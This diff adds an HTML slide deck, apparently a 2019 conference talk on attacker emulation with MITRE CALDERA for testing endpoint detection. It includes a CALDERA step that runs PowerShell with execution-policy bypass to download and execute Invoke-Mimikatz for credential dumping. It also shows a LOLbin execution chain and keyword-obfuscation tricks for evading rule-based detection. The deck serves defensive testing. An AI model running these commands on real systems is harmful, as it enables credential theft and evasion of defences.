@@ -1,0 +1,581 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <meta http-equiv="Content-Style-Type" content="text/css" />
+  <meta name="generator" content="pandoc" />
+  <meta name="author" content="Wietze Beukema (@Wietze)" />
+  <title>The Imitation Game: Attacker Emulation</title>
+  <style type="text/css">
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <style type="text/css">
+a.sourceLine { display: inline-block; line-height: 1.25; }
+a.sourceLine { pointer-events: none; color: inherit; text-decoration: inherit; }
+a.sourceLine:empty { height: 1.2em; position: absolute; }
+.sourceCode { overflow: visible; }
+code.sourceCode { white-space: pre; position: relative; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+code.sourceCode { white-space: pre-wrap; }
+a.sourceLine { text-indent: -1em; padding-left: 1em; }
+}
+pre.numberSource a.sourceLine
+  { position: relative; }
+pre.numberSource a.sourceLine:empty
+  { position: absolute; }
+pre.numberSource a.sourceLine::before
+  { content: attr(data-line-number);
+    position: absolute; left: -5em; text-align: right; vertical-align: baseline;
+    border: none; pointer-events: all;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    color: #aaaaaa;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+div.sourceCode
+  {  }
+@media screen {
+a.sourceLine::before { text-decoration: underline; }
+}
+code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+code span.at { color: #7d9029; } /* Attribute */
+code span.bn { color: #40a070; } /* BaseN */
+code span.bu { } /* BuiltIn */
+code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+code span.ch { color: #4070a0; } /* Char */
+code span.cn { color: #880000; } /* Constant */
+code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+code span.dt { color: #902000; } /* DataType */
+code span.dv { color: #40a070; } /* DecVal */
+code span.er { color: #ff0000; font-weight: bold; } /* Error */
+code span.ex { } /* Extension */
+code span.fl { color: #40a070; } /* Float */
+code span.fu { color: #06287e; } /* Function */
+code span.im { } /* Import */
+code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+code span.op { color: #666666; } /* Operator */
+code span.ot { color: #007020; } /* Other */
+code span.pp { color: #bc7a00; } /* Preprocessor */
+code span.sc { color: #4070a0; } /* SpecialChar */
+code span.ss { color: #bb6688; } /* SpecialString */
+code span.st { color: #4070a0; } /* String */
+code span.va { color: #19177c; } /* Variable */
+code span.vs { color: #4070a0; } /* VerbatimString */
+code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+  </style>
+  <link href="https://fonts.googleapis.com/css?family=Ubuntu+Mono" rel="stylesheet">
+  <link rel="stylesheet" type="text/css" media="screen, projection, print"
+    href="https://www.w3.org/Talks/Tools/Slidy2/styles/slidy.css" />
+  <link rel="stylesheet" type="text/css" media="screen, projection, print"
+   href="css/pwc.css" />
+<script src="https://www.w3.org/Talks/Tools/Slidy2/scripts/slidy.js" charset="utf-8" type="text/javascript"></script>
+<script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+<script type="text/javascript" defer>jQuery( document ).ready(function() { function x (){ jQuery("div.slide:has(p > img.split)").attr("style", "padding-right: 40% !important"); } window.setTimeout( x, 3000 ); });</script>
+</head>
+<body>
+<div class="slide titlepage ">
+<div class="bg" style="background-image:url(img/front.jpg);"></div>
+<div id="block1" class="block"></div>
+<div id="block2" class="block"></div>
+<div id="block4" class="block"></div>
+<div id="block3" class="block">
+  <h1 class="title">The Imitation Game: Attacker Emulation</h1>
+  <p class="author">
+Wietze Beukema (<span class="citation" data-cites="Wietze">@Wietze</span>)
+  </p>
+  <p class="date">June 2019</p>
+<div id="pwc-logo"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMkAAACmCAMAAAEwvWsuAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAALcUExURQAAAP7+/v////7+/v7+/v7+/v7+/v7+/v7+/v////7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v////7+/v7+/v7+/v////7+/v////7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v////7+/v7+/v7+/v7+/v7+/v7+/v7+/v////7+/v7+/v////7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v////7+/v////7+/v7+/v////7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v////7+/v7+/v////7+/v7+/v7+/v7+/v////7+/v7+/v7+/v7+/v7+/v7+/v////7+/v7+/v7+/v7+/v7+/v7+/v7+/v////7+/v7+/v7+/v////7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v////7+/v7+/v7+/v7+/v////7+/v7+/v7+/v7+/v7+/v////7+/v////7+/v7+/v7+/v7+/v7+/v7+/v////7+/v7+/v////7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v////7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v////7+/v7+/v7+/v7+/v7+/v////7+/v7+/v////7+/v7+/v////7+/v7+/v7+/v7+/v////7+/v7+/v7+/v7+/v////7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v////7+/v7+/v////7+/v7+/v7+/v////7+/v7+/v7+/v7+/v////7+/v7+/v7+/v7+/v7+/v7+/v////7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v////7+/v7+/v7+/q+2TQAAAAD0dFJOUwCvQBpbB91IifDKNXa3+GOk5ZEi0j1+D79QKmusF+1YmdpFhscycwS0H/Wh4k3PYDp7DLwn/Wip6tdCgxTEVS9wAbEc8l2eCd9Kize5JPplzKbneFKT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" alt="PwC Logo" /></div>
+</div>
+</div>
+<h1 id="who-dis">Who dis?</h1>
+<ul>
+<li>BSides London newbie</li>
+<li>Endpoint Threat Detection @ PwC</li>
+</ul>
+<h1 id="whats-next">What’s next?</h1>
+<ol type="1">
+<li>Why</li>
+<li>How</li>
+<li>Cool stuff</li>
+</ol>
+<p><img src="img/go.png" class="split" /></p>
+<h1 id="attacker-emulation">Attacker emulation</h1>
+<p><strong>Attacker Emulation</strong>: Do what an attacker would do <!-- * To catch a thief you have to think like a thief
+     * Mimicking attacker behaviour in a controlled environment
+     * Know your attacker! --></p>
+<h1 id="attacker-emulation-2">Attacker emulation (2)</h1>
+<h2 id="but-why">… but why?</h2>
+<ol type="1">
+<li><strong>Test</strong> your own detection capability (with a realistic attack model)</li>
+<li><strong>Research</strong> and test new attacker techniques</li>
+<li><strong>Showing off</strong> (we all want to)</li>
+</ol>
+<!-- * Model after a _real_ attacker has benefits - but AE can be done in various ways 
+     * Knowing your attacker = knowing your attacks
+     * With AE, you can show that what you're doing has effect/impact, but it's not proof -->
+<h1 id="attacker-emulation-mode">Attacker emulation mode</h1>
+<ul>
+<li><p>Post-compromise</p></li>
+<li><strong>Manner</strong>: Automated vs manual
+<ul>
+<li>Automated saves time, easy to rerun</li>
+</ul></li>
+<li><strong>Scope</strong>: Atomatic vs end-to-end [<a href="https://www.youtube.com/watch?v=mpLfQNLntfg">0</a>]
+<ul>
+<li>Atomic: ‘BAT file’</li>
+<li>Chained</li>
+<li>End-to-end: links actions together, more realistic</li>
+</ul></li>
+</ul>
+<!-- * Assume post-compromise: initial infection is out of scope
+     * You generally have to 'infect' your machines, which live in a representative/controled enviroment
+     * More on manner, scope, etc., check out https://www.youtube.com/watch?v=mpLfQNLntfg -->
+<h1 id="attacker-emulation-mode-a-trade-off">Attacker emulation mode: a trade-off</h1>
+<figure>
+<img src="img/tradeoff.svg" alt="_" class="full-width-title" /><figcaption>_</figcaption>
+</figure>
+<h1 id="section"></h1>
+<figure>
+<img src="img/xkcd.png" alt="Source: https://xkcd.com/927/" class="full-width" /><figcaption>Source: https://xkcd.com/927/</figcaption>
+</figure>
+<h1 id="tools">Tools</h1>
+<table>
+<colgroup>
+<col style="width: 53%" />
+<col style="width: 46%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>List of open-source ATT&amp;CK™ framework emulation tools</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><ul>
+<li>Red Canary Atomic Red [<a href="https://github.com/redcanaryco/atomic-red-team">1</a>]</li>
+<li>Uber Metta [<a href="https://github.com/uber-common/metta">2</a>]</li>
+<li>MITRE CALDERA [<a href="https://github.com/mitre/caldera">3</a>]</li>
+<li>Endgame Red Team Automation [<a href="https://github.com/redcanaryco/atomic-red-team">4</a>]</li>
+<li>Guardicore Infection Monkey [<a href="https://github.com/guardicore/monkey">5</a>]</li>
+<li>NextronSystem APTSimulator [<a href="https://github.com/NextronSystems/APTSimulator">6</a>]</li>
+<li>RE:TERNAL [<a href="https://github.com/d3vzer0/reternal-quickstart">7</a>]</li>
+</ul></td>
+<td><ul>
+<li>Blue Team Training Toolkit (BT3) [<a href="https://www.encripto.no/en/downloads-2/tools/">8</a>]</li>
+<li>DumpsterFire [<a href="https://github.com/TryCatchHCF/DumpsterFire">9</a>]</li>
+<li>AutoTTP [<a href="https://github.com/jymcheong/AutoTTP">10</a>]</li>
+<li>MITRE/NSA Unfetter [<a href="https://nsacyber.github.io/unfetter/">11</a>]</li>
+<li>MATE [<a href="https://github.com/fugawi/mate">12</a>]</li>
+<li>Praetorian Purple Team Automation [<a href="https://github.com/praetorian-inc/purple-team-attack-automation">13</a>]</li>
+</ul></td>
+</tr>
+</tbody>
+</table>
+<p>… and <em>many</em> more</p>
+<!-- Bottom line: too many options, not compatible with each other. 
+     Call to action: stop the tool madness -->
+<h1 id="tools-2">Tools (2)</h1>
+<table>
+<thead>
+<tr class="header">
+<th><strong>Vendor</strong></th>
+<th><strong>Product</strong></th>
+<th><strong>Automated?</strong></th>
+<th><strong>Dynamic?</strong></th>
+<th><strong>Supported Platforms</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Red Canary</td>
+<td>Atomic Red</td>
+<td>❌</td>
+<td>❌</td>
+<td><img src="img/windows.png" alt="Windows" /> <img src="img/linux.png" alt="Linux" /> <img src="img/apple.png" alt="macOS" /></td>
+</tr>
+<tr class="even">
+<td>Uber</td>
+<td>Metta</td>
+<td>✔️</td>
+<td>❌</td>
+<td><img src="img/windows.png" alt="Windows" /> <img src="img/linux.png" alt="Linux" /> <img src="img/apple.png" alt="macOS" /></td>
+</tr>
+<tr class="odd">
+<td>MITRE</td>
+<td>CALDERA 2.0</td>
+<td>✔️</td>
+<td>✔️/❌ ️️️️️️</td>
+<td><img src="img/windows.png" alt="Windows" /> <img src="img/linux.png" alt="Linux" /> <img src="img/apple.png" alt="macOS" /></td>
+</tr>
+<tr class="even">
+<td>MITRE</td>
+<td>CALDERA 1.0</td>
+<td>✔️</td>
+<td>✔️</td>
+<td><img src="img/windows.png" alt="Windows" /></td>
+</tr>
+<tr class="odd">
+<td>Endgame</td>
+<td>Red Team Automation</td>
+<td>✔️</td>
+<td>✔️</td>
+<td><img src="img/windows.png" alt="Windows" /></td>
+</tr>
+</tbody>
+</table>
+<h1 id="tools-3">Tools (3)</h1>
+<h2 id="finding-your-eve">Finding your Eve</h2>
+<ul>
+<li><p><strong>What are you trying to achieve?</strong></p></li>
+<li><p>Goal?</p></li>
+<li><p>Scope?</p></li>
+<li><p>Realistic?</p></li>
+<li><p>Easy to maintain?</p>
+<ul>
+<li>Isolated actions are easier to create and update</li>
+</ul></li>
+</ul>
+<h1 id="mitre-caldera">MITRE CALDERA</h1>
+<ul>
+<li>Open-source research project[<a href="https://www.mitre.org/research/technology-transfer/open-source-software/caldera">14</a>] by MITRE</li>
+<li>Comes with several actions out of the box</li>
+<li><p>Distinguishing features:</p>
+<ol type="1">
+<li>‘Actions’ written in <strong>Python</strong></li>
+<li>Works with <strong>pre and post conditions</strong></li>
+<li>Comes with <strong>heuristic planner</strong>, linking actions together</li>
+</ol></li>
+</ul>
+<h1 id="typical-set-up">Typical set up</h1>
+<figure>
+<img src="img/structure.svg" alt="_" class="full-width-title" /><figcaption>_</figcaption>
+</figure>
+<h1 id="sample-workflow">Sample workflow</h1>
+<figure>
+<img src="img/flow_1.svg" alt="_" class="full-width-title" /><figcaption>_</figcaption>
+</figure>
+<h1 id="sample-workflow-2">Sample workflow (2)</h1>
+<figure>
+<img src="img/flow_2.svg" alt="_" class="full-width-title" /><figcaption>_</figcaption>
+</figure>
+<!-- If you specify your pre and post conditions the right way, CALDERA will do all the hard work for you -->
+<h1 id="typical-caldera-class">Typical CALDERA class</h1>
+<ul>
+<li><p>Pre/post conditions</p></li>
+<li><p>The action itself</p></li>
+<li><p>Clean-up</p></li>
+</ul>
+<h1 id="typical-caldera-class-2">Typical CALDERA class (2)</h1>
+<ul>
+<li><p>Pre/post conditions</p>
+<ul>
+<li>If you have admin rights, this can give you credentials</li>
+</ul></li>
+<li><p>The action itself</p>
+<ul>
+<li>Run Mimikatz</li>
+</ul></li>
+<li><p>Clean-up</p>
+<ul>
+<li>Remove obfuscated Mimikatz, logs</li>
+</ul></li>
+</ul>
+<h1 id="typical-caldera-class-3">Typical CALDERA class (3)</h1>
+<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb1-1" data-line-number="1"><span class="kw">class</span> DumpCreds(Step):</a>
+<a class="sourceLine" id="cb1-2" data-line-number="2">    display_name <span class="op">=</span> <span class="st">&quot;dump_creds&quot;</span></a>
+<a class="sourceLine" id="cb1-3" data-line-number="3">    summary <span class="op">=</span> <span class="st">&quot;Run Invoke-Mimikatz to obtain credentials.&quot;</span></a>
+<a class="sourceLine" id="cb1-4" data-line-number="4">    attack_mapping <span class="op">=</span> [(<span class="st">&#39;T1003&#39;</span>, <span class="st">&#39;Credential Access&#39;</span>)]</a>
+<a class="sourceLine" id="cb1-5" data-line-number="5"></a>
+<a class="sourceLine" id="cb1-6" data-line-number="6">    preconditions <span class="op">=</span> [(<span class="st">&quot;rat&quot;</span>, OPRat({<span class="st">&quot;elevated&quot;</span>: <span class="va">True</span>}))]</a>
+<a class="sourceLine" id="cb1-7" data-line-number="7">    postconditions <span class="op">=</span> [(<span class="st">&quot;user_g&quot;</span>, OPUser),</a>
+<a class="sourceLine" id="cb1-8" data-line-number="8">                      (<span class="st">&quot;credential_g&quot;</span>, OPCredential)]</a></code></pre></div>
+<div class="sourceCode" id="cb2"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb2-1" data-line-number="1">    <span class="at">@staticmethod</span></a>
+<a class="sourceLine" id="cb2-2" data-line-number="2">    <span class="cf">async</span> <span class="kw">def</span> action(operation, rat, host, software, file_g, process_g, software_g):</a>
+<a class="sourceLine" id="cb2-3" data-line-number="3">        <span class="co"># Step 1: run Mimikatz in memory</span></a>
+<a class="sourceLine" id="cb2-4" data-line-number="4">        MIMIKATZ_URL <span class="op">=</span> <span class="st">&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016f(...)67b3/Exfiltration/Invoke-Mimikatz.ps1&quot;</span></a>
+<a class="sourceLine" id="cb2-5" data-line-number="5">        ps_parameters <span class="op">=</span> [<span class="st">&#39;powershell.exe&#39;</span>, <span class="st">&#39;-exec&#39;</span>, <span class="st">&#39;bypass&#39;</span>, <span class="st">&#39;-C&#39;</span>, <span class="st">&#39;IEX(IWR </span><span class="ch">\&#39;</span><span class="sc">{}</span><span class="ch">\&#39;</span><span class="st">); Invoke-Mimikatz -DumpCreds&#39;</span>.<span class="bu">format</span>(MIMIKATZ_URL)]</a>
+<a class="sourceLine" id="cb2-6" data-line-number="6"></a>
+<a class="sourceLine" id="cb2-7" data-line-number="7">        credentials <span class="op">=</span> (<span class="cf">await</span> operation.execute_shell_command(rat, command.CommandLine(ps_parameters), DumpCreds.parser))</a>
+<a class="sourceLine" id="cb2-8" data-line-number="8"></a>
+<a class="sourceLine" id="cb2-9" data-line-number="9">        <span class="co"># Step 2: parse credentials</span></a>
+<a class="sourceLine" id="cb2-10" data-line-number="10">        <span class="cf">for</span> cred <span class="kw">in</span> credentials:</a>
+<a class="sourceLine" id="cb2-11" data-line-number="11">            <span class="co"># Generate User object</span></a>
+<a class="sourceLine" id="cb2-12" data-line-number="12">            user_obj <span class="op">=</span> <span class="cf">await</span> user_g({<span class="st">&#39;username&#39;</span>: cred[<span class="st">&#39;username&#39;</span>], <span class="st">&#39;is_group&#39;</span>: <span class="va">False</span>})</a>
+<a class="sourceLine" id="cb2-13" data-line-number="13">            <span class="co"># Generate Credential object</span></a>
+<a class="sourceLine" id="cb2-14" data-line-number="14">            <span class="cf">await</span> credential_g({<span class="st">&#39;password&#39;</span>: cred[<span class="st">&#39;password&#39;</span>], <span class="st">&#39;found_on_host&#39;</span>: rat.host, <span class="st">&#39;user&#39;</span>: user_obj})</a>
+<a class="sourceLine" id="cb2-15" data-line-number="15"></a>
+<a class="sourceLine" id="cb2-16" data-line-number="16">        <span class="cf">return</span> <span class="va">True</span></a></code></pre></div>
+<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb3-1" data-line-number="1"><span class="at">@staticmethod</span></a>
+<a class="sourceLine" id="cb3-2" data-line-number="2">    <span class="cf">async</span> <span class="kw">def</span> cleanup(cleaner, host):</a>
+<a class="sourceLine" id="cb3-3" data-line-number="3">        <span class="cf">pass</span></a></code></pre></div>
+<h1 id="challenges">Challenges</h1>
+<ul>
+<li><strong>Selecting</strong> your attacker</li>
+<li><strong>Detection</strong> (detecting the right thing, bad ‘learning’ mechanisms)</li>
+<li><strong>Realism</strong> (techniques, timing, propagation)</li>
+</ul>
+<!-- * Some rule-based systems might be looking for the wrong thing, e.g. `evil.ps1`.
+     * You don't want to detect a filename, you want to detect a behaviour!
+     * AE to the rescue: randomise your behaviour and see what your defences pick up -->
+<h1 id="beyond-standard-caldera">Beyond standard CALDERA</h1>
+<p>Focus on three extensions:</p>
+<ol type="1">
+<li>LOLbins/LOLbas implementation (T1218, T1216, …)</li>
+<li>Common obfuscation techniques (T1140)</li>
+<li>Masquerading techniques (T1036)</li>
+</ol>
+<h1 id="lolbins">1: LOLbins</h1>
+<h1 id="beyond-standard-caldera-lolbins">Beyond standard CALDERA: LOLbins</h1>
+<p><img src="img/bliss.jpg" class="split" /></p>
+<ul>
+<li><strong>LOLbins</strong>: why bring your own tools if you can use pre-installed ones? ¯\_(ツ)_/¯ <!-- application whitelist bypass / staying under the (endpoint) radar / minimal network traffic --></li>
+<li><p>Various options [<a href="https://github.com/LOLBAS-Project/LOLBAS">15</a>]</p>
+<ul>
+<li>Common: PowerShell, wscript/cscript, mshta</li>
+<li>Other examples: regasm, xwizards, msbuild, pubprn.vbs</li>
+</ul></li>
+</ul>
+<h1 id="beyond-standard-caldera-lolbins-2">Beyond standard CALDERA: LOLbins (2)</h1>
+<p><img src="img/bliss.jpg" class="split" /></p>
+<ul>
+<li><strong>Precondition</strong>: awareness of command to run</li>
+<li><strong>Postcondition</strong>: command will have executed</li>
+</ul>
+<h1 id="beyond-standard-caldera-lolbins-3">Beyond standard CALDERA: LOLbins (3)</h1>
+<p><img src="img/bliss.jpg" class="split" /> Example:</p>
+<ul>
+<li><strong>Precondition</strong>: the command <code>evil.exe</code> needs to be run</li>
+<li><strong>Action</strong>: use the <code>regasm.exe /u</code> LOLbin</li>
+<li><strong>Postcondition</strong>: the command <code>evil.exe</code> successfully ran</li>
+</ul>
+<pre><code>🔴 C:\Windows\System32\wininit.exe
+ └── ⚙️ C:\Windows\System32\services.exe
+   └── ⚙️ C:\Windows\System32\commander.exe
+     └── ⚙️ C:\Windows\System32\regasm.exe /u AdobeUpdater.dll
+       └── ⚙️ C:\Windows\temp\evil.exe</code></pre>
+<h1 id="obfuscation">2: Obfuscation</h1>
+<h1 id="beyond-standard-caldera-obfuscatet1140">Beyond standard CALDERA: Obfuscate<sup>T1140</sup></h1>
+<p><img src="img/obfuscate.png" class="split" /></p>
+<ul>
+<li>Hide keywords that might trigger rule-based systems</li>
+<li><p>Various techniques available [<a href="https://www.x33fcon.com/archive/2018/slides/x33fcon18_DevSecDefense_DanielBohannon.pdf">16</a>], e.g.</p>
+<ul>
+<li>Concatenation <code>&quot;Hell&quot;+&quot;o wo&quot;+&quot;rld&quot;</code></li>
+<li>Escaping <code>&quot;H`e`llo W`orld&quot;</code></li>
+<li>Format string <code>&quot;{1}{0}&quot;-f&quot;o, world&quot;,&quot;Hell&quot;</code></li>
+<li>Base64 encode</li>
+</ul></li>
+<li><p>However: can easily be detected by entropy analysis</p></li>
+</ul>
+<h1 id="beyond-standard-caldera-obfuscatet1140-2">Beyond standard CALDERA: Obfuscate<sup>T1140</sup> (2)</h1>
+<p>Example:</p>
+<ul>
+<li><p><strong>Precondition</strong>: this command needs to run:</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode php"><code class="sourceCode php"><a class="sourceLine" id="cb5-1" data-line-number="1">powershell.exe /c <span class="st">&quot;IEX (IEW https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1);&quot;</span></a></code></pre></div></li>
+<li><p><strong>Action</strong>:</p>
+<ol type="1">
+<li>Obfuscate command line using format string, e.g.</li>
+</ol>
